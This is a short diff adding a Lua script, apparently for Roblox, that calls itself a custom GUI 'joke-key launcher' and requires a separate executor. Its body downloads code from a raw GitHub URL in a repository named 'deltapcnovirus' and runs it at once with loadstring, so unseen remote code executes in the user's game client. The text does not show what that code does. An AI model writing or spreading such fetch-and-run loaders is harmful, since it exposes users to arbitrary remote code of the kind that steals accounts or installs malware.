@@ -1,0 +1,5 @@
+-- Custom GUI joke-key launcher (requires a separate executor)
+local source = game:HttpGet("https://raw.githubusercontent.com/a65407112-boop/deltapcnovirus/main/client.lua")
+local init, err = loadstring(source)
+assert(init, err)
+return init()(true)
